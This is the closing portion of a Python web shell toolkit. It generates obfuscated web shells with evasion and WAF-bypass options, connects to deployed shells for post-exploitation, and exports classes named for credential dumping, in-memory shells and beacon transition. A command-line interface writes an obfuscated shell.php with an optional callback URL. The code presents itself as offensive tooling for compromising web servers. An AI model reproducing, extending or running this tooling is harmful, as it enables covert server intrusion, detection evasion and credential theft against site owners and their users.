    def _load_config(self, path: Optional[str]) -> Dict[str, Any]:
        """Load configuration from file"""
        if path and os.path.exists(path):
            import yaml
            with open(path) as f:
                return yaml.safe_load(f)
        return {}
    
    def generate_shell(
        self,
        shell_type: ShellType,
        obfuscation: ObfuscationLevel = ObfuscationLevel.HIGH,
        password: str = "",
        evasion: List[EvasionTechnique] = None,
        **kwargs
    ) -> ShellPayload:
        """Generate a new web shell"""
        config = WebShellConfig(
            shell_type=shell_type,
            obfuscation_level=obfuscation,
            password=password,
            evasion_techniques=evasion or [],
            **kwargs
        )
        
        self.generator.config = config
        payload = self.generator.generate()
        
        # Store generated shell
        self.shells[payload.hash_md5] = payload
        
        return payload
    
    def connect(self, shell_url: str, password: str = "") -> PostExploitEngine:
        """Connect to deployed web shell"""
        session = PostExploitEngine(shell_url, password)
        self.sessions[shell_url] = session
        return session
    
    def get_shell_stats(self) -> Dict[str, Any]:
        """Get statistics about generated shells"""
        return {
            "total_generated": len(self.shells),
            "active_sessions": len(self.sessions),
            "shells_by_type": {
                st.value: len([s for s in self.shells.values() if s.shell_type == st])
                for st in ShellType
            }
        }

# ============================================================================
# EXPORTS
# ============================================================================

__all__ = [
    # Enums
    "ShellType",
    "ObfuscationLevel", 
    "EvasionTechnique",
    "PostExploitAction",
    
    # Data classes
    "WebShellConfig",
    "ExfilTarget",
    "ScanTarget",
    "ShellPayload",
    
    # Main classes
    "AIObfuscator",
    "WAFBypass",
    "WebShellGenerator",
    "PostExploitEngine",
    "CredentialDumper",
    "MemoryShell",
    "BeaconTransition",
    "WebShellManager",
]

# ============================================================================
# CLI INTERFACE
# ============================================================================

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Web Shell Generator")
    parser.add_argument("-t", "--type", choices=[s.value for s in ShellType], default="php")
    parser.add_argument("-o", "--obfuscation", type=int, choices=[0,1,2,3,4,5], default=3)
    parser.add_argument("-p", "--password", default="")
    parser.add_argument("-e", "--evasion", nargs="+", default=[])
    parser.add_argument("-c", "--callback", default="")
    parser.add_argument("--output", "-O", default="shell.php")
    
    args = parser.parse_args()
    
    # Parse evasion techniques
    evasion_map = {e.name.lower(): e for e in EvasionTechnique}
    evasion_list = [evasion_map[e.lower()] for e in args.evasion if e.lower() in evasion_map]
    
    config = WebShellConfig(
        shell_type=ShellType(args.type),
        obfuscation_level=ObfuscationLevel(args.obfuscation),
        password=args.password,
        evasion_techniques=evasion_list,
        callback_url=args.callback or None
    )
    
    generator = WebShellGenerator(config)
    payload = generator.generate()
    
    # Write to file
    with open(args.output, "w") as f:
        f.write(payload.code)
    
    print(f"Generated: {args.output}")
    print(f"Type: {payload.shell_type.value}")
    print(f"Obfuscation: {payload.obfuscation_level.name}")
    print(f"Size: {payload.size_bytes} bytes")
    print(f"MD5: {payload.hash_md5}")
    print(f"SHA256: {payload.hash_sha256}")
